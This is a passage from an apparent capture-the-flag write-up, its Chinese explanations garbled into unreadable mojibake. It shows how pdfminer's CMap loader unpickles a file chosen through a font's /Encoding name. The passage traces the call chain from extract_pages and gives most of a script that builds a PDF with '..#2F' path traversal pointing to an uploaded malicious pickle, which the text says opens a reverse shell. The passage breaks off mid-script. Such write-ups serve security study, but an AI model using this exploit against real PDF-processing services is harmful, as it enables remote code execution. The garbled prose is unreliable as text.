</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>ä»ä¸€ä¸ªæ–‡ä»¶é‡Œé¢å¯¼å…¥äº†æ¨¡å—ï¼Œçœ‹çœ‹è¿™ä¸ªæ–‡ä»¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pdfminer.high_level</span> <span class=kn>import</span> <span class=n>extract_pages</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pdfminer.layout</span> <span class=kn>import</span> <span class=n>LTTextContainer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pdf_to_text</span><span class=p>(</span><span class=n>pdf_path</span><span class=p>,</span> <span class=n>txt_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>txt_path</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>txt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>page_layout</span> <span class=ow>in</span> <span class=n>extract_pages</span><span class=p>(</span><span class=n>pdf_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>element</span> <span class=ow>in</span> <span class=n>page_layout</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>element</span><span class=p>,</span> <span class=n>LTTextContainer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>txt</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>element</span><span class=o>.</span><span class=n>get_text</span><span class=p>())</span>
</span></span><span class=line><span class=cl>                    <span class=n>txt</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>é˜Ÿå‹åœ¨è¿™é‡Œé¢æ‰¾åˆ°äº†load</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl>    <span class=nd>@classmethod</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_load_data</span><span class=p>(</span><span class=bp>cls</span><span class=p>,</span> <span class=n>name</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Any</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>name</span> <span class=o>=</span> <span class=n>name</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\0</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%s</span><span class=s2>.pickle.gz&#34;</span> <span class=o>%</span> <span class=n>name</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s2>&#34;loading: </span><span class=si>%r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>cmap_paths</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;CMAP_PATH&#34;</span><span class=p>,</span> <span class=s2>&#34;/usr/share/pdfminer/&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=vm>__file__</span><span class=p>),</span> <span class=s2>&#34;cmap&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>directory</span> <span class=ow>in</span> <span class=n>cmap_paths</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>directory</span><span class=p>,</span> <span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>gzfile</span> <span class=o>=</span> <span class=n>gzip</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>name</span><span class=p>),</span> <span class=p>(),</span> <span class=n>pickle</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>gzfile</span><span class=o>.</span><span class=n>read</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>                <span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>gzfile</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=n>CMapDB</span><span class=o>.</span><span class=n>CMapNotFound</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å®Œå…¨å¯æ§ï¼Œæ‰€ä»¥ç”Ÿæˆæ¶æ„çš„tar.gzå’ŒPDFæ–‡ä»¶ä¸Šä¼ å³å¯ï¼Œä½†æ˜¯éƒ½æ˜¯éœ€è¦ä¼ªé€ æˆpdfæ–‡ä»¶æ‰èƒ½å¤Ÿä¸Šä¼ çš„ï¼Œç¬¬ä¸€æ­¥ç”Ÿæˆä¸€ä¸ªæœ‰æ¶æ„opcodeçš„n4c1.pickle.gzï¼Œç„¶åæœ€åçš„PDFè¿˜éœ€è¦å»è§£æ/app/uploads/n4c1ï¼Œå°±å¯ä»¥æˆåŠŸåå¼¹shelläº†</p><p>ç”Ÿæˆpdfå»åŠ è½½opcode</p><p>æ„é€ æ€è·¯, å…¨å±€æœç´¢ _load_dataæ–¹æ³•</p><p><img src=/img/2025-WMCTF/2.png alt=img></p><p>æœ‰ä¸¤å¤„è§¦å‘ç‚¹, è¿™é‡Œé€‰ç”¨get_cmap, ç»§ç»­å¾€ä¸Šæ‰¾, å¯ä»¥æ‰¾åˆ°ä»¥ä¸‹è°ƒç”¨è·¯å¾„</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>extract_pages
</span></span><span class=line><span class=cl>        PDFPageInterpreter#process_page
</span></span><span class=line><span class=cl>                PDFPageInterpreter#render_contents
</span></span><span class=line><span class=cl>                        PDFPageInterpreter#process_page
</span></span><span class=line><span class=cl>                                PDFPageInterpreter#render_contents
</span></span><span class=line><span class=cl>                                        PDFPageInterpreter#init_resources
</span></span><span class=line><span class=cl>                                                PDFResourceManager#get_font
</span></span><span class=line><span class=cl>                                                        PDFCIDFont#__init__
</span></span><span class=line><span class=cl>                                                                PDFCIDFont#get_cmap_from_spec
</span></span><span class=line><span class=cl>                                                                        CMapDB.get_cmap(cmap_name)
</span></span><span class=line><span class=cl>                                                                            _load_data
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><p>extract_pageså°±æ˜¯é¢˜ç›®è°ƒç”¨çš„åœ°æ–¹</p><p>é€šè¿‡è°ƒè¯•å‘ç°æœ€å_load_dataçš„å‚æ•°æ˜¯ç”±/Encodingæ§åˆ¶çš„, æ­¤å¤–pdfä¸­ä½¿ç”¨ # æ¥è½¬ä¹‰ä¸€ä¸ª16è¿›åˆ¶æ•°, è¿™æ ·å°±å¯ä»¥ä½¿ç”¨ ..#2Fæ„é€ å‡º ../ , é¿å…ä¸pdfä¸­ç¬¦å· / è¡¨ç¤ºåå­—å¯¹è±¡å†²çª</p><p>genPDF.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>__future__</span> <span class=kn>import</span> <span class=n>annotations</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>io</span> <span class=kn>import</span> <span class=n>BytesIO</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>logging</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>logging</span><span class=o>.</span><span class=n>basicConfig</span><span class=p>(</span><span class=n>level</span><span class=o>=</span><span class=n>logging</span><span class=o>.</span><span class=n>DEBUG</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># This script hardcodes and generates a small PDF containing a variety of</span>
</span></span><span class=line><span class=cl><span class=c1># page-content operators (graphics, text, state) so you can step through</span>
</span></span><span class=line><span class=cl><span class=c1># pdfminer.six extract_pages() and observe how each operator is handled.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Output: samples/debug_ops.pdf</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Key points to help debugging pdfminer internals:</span>
</span></span><span class=line><span class=cl><span class=c1># - The font is a Type0 + CIDFont with /Encoding /GB-EUC-H to trigger</span>
</span></span><span class=line><span class=cl><span class=c1>#   CMapDB.get_cmap(&#39;GB-EUC-H&#39;) and thus CMapDB._load_data when not cached.</span>
</span></span><span class=line><span class=cl><span class=c1># - The content stream includes operators: q/Q, cm, w, RG, rg, m, l, h, S,</span>
</span></span><span class=line><span class=cl><span class=c1>#   re, f, BT/ET, Tf, Td, Tm (implicit via Td), Tj, TJ.</span>
</span></span><span class=line><span class=cl><span class=c1># - Chinese text bytes &lt;D6D0B9FA&gt; represent &#34;ä¸­å›½&#34; in GB2312, so with</span>
</span></span><span class=line><span class=cl><span class=c1>#   /Encoding /GB-EUC-H pdfminer will consult the CMap.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_pdf_bytes</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>bio</span> <span class=o>=</span> <span class=n>BytesIO</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>w</span><span class=p>(</span><span class=n>s</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>pos</span> <span class=o>=</span> <span class=n>bio</span><span class=o>.</span><span class=n>tell</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>bio</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>pos</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Collect objects then build xref.</span>
</span></span><span class=line><span class=cl>    <span class=n>objects</span><span class=p>:</span> <span class=nb>list</span><span class=p>[</span><span class=nb>tuple</span><span class=p>[</span><span class=nb>int</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>]]</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 1. Catalog</span>
</span></span><span class=line><span class=cl>    <span class=n>objects</span><span class=o>.</span><span class=n>append</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 2. Pages</span>
</span></span><span class=line><span class=cl>    <span class=n>objects</span><span class=o>.</span><span class=n>append</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 4. Type0 Font with GB-EUC-H encoding to trigger CMap loading</span>
</span></span><span class=line><span class=cl>    <span class=n>font_type0</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=mi>4</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;&lt;&lt; /Type /Font /Subtype /Type0 &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/BaseFont /DebugCID &#34;</span>
</span></span><span class=line><span class=cl>            <span class=c1># b&#34;/Encoding /..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Ftmp#2Fn4c1&#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/Encoding /..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Fapp#2Fuploads#2Fn4c1&#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/DescendantFonts [6 0 R] &gt;&gt;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>objects</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>font_type0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 6. CIDFont descendant with GB1 registry</span>
</span></span><span class=line><span class=cl>    <span class=n>cidfont</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=mi>6</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;&lt;&lt; /Type /Font /Subtype /CIDFontType0 &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/BaseFont /DebugCID &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/CIDSystemInfo &lt;&lt; /Registry (n4c1222) /Ordering (n4c1_2) /Supplement 5 &gt;&gt; &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/DW 1000 &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/FontDescriptor &lt;&lt; &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/Type /FontDescriptor &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/FontName /DebugCID &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/FontBBox [0 -200 1000 900] &#34;</span>  <span class=c1># å¿…é¡»æ˜¯å››ä¸ªæ•°å­—</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/Ascent 800 &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/Descent -200 &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/CapHeight 700 &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/Flags 32 &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/ItalicAngle 0 &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/StemV 80 &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;&gt;&gt;&#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;&gt;&gt;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>objects</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>cidfont</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 5. Page content stream â€” includes a variety of operators</span>
</span></span><span class=line><span class=cl>    <span class=c1># Note: GB2312 for ä¸­å›½ is D6 D0 B9 FA</span>
</span></span><span class=line><span class=cl>    <span class=n>content_ops</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;q&#34;</span><span class=p>,</span>  <span class=c1># save graphics state</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;1 0 0 1 0 0 cm&#34;</span><span class=p>,</span>  <span class=c1># identity CTM (explicit)</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;0.75 w&#34;</span><span class=p>,</span>  <span class=c1># line width</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;0 0 1 RG&#34;</span><span class=p>,</span>  <span class=c1># stroke color = blue</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;1 0 0 rg&#34;</span><span class=p>,</span>  <span class=c1># fill color = red</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;100 600 m&#34;</span><span class=p>,</span>  <span class=c1># move to</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;200 650 l&#34;</span><span class=p>,</span>  <span class=c1># line to</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;300 600 l&#34;</span><span class=p>,</span>  <span class=c1># line to</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;h&#34;</span><span class=p>,</span>  <span class=c1># close path</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;S&#34;</span><span class=p>,</span>  <span class=c1># stroke</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;100 500 150 40 re&#34;</span><span class=p>,</span>  <span class=c1># rectangle</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;f&#34;</span><span class=p>,</span>  <span class=c1># fill</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;BT&#34;</span><span class=p>,</span>  <span class=c1># begin text</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/F1 24 Tf&#34;</span><span class=p>,</span>  <span class=c1># font + size</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;100 700 Td&#34;</span><span class=p>,</span>  <span class=c1># move text position</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;&lt;48656C6C6F20504446&gt; Tj&#34;</span><span class=p>,</span>  <span class=c1># &#34;Hello PDF&#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;0 -30 Td&#34;</span><span class=p>,</span>  <span class=c1># next line down</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;&lt;D6D0B9FA&gt; Tj&#34;</span><span class=p>,</span>  <span class=c1># &#34;ä¸­å›½&#34; in GB2312; mapped via GB-EUC-H</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;-50 -40 Td&#34;</span><span class=p>,</span>  <span class=c1># move</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;[(AB) -50 (&lt;20&gt;) 100 (CD)] TJ&#34;</span><span class=p>,</span>  <span class=c1># kerning array example</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;ET&#34;</span><span class=p>,</span>  <span class=c1># end text</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;Q&#34;</span><span class=p>,</span>  <span class=c1># restore graphics state</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>stream</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;stream</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>content_ops</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>endstream&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>content_len</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>stream</span><span class=p>)</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;stream</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>endstream&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>content_obj</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=mi>5</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s2>&#34;&lt;&lt; /Length </span><span class=si>%d</span><span class=s2> &gt;&gt;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>content_len</span> <span class=o>+</span> <span class=n>stream</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>objects</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>content_obj</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 3. Page (references content and font resource)</span>
</span></span><span class=line><span class=cl>    <span class=n>page_dict</span> <span class=o>=</span> <span class=p>(</span>
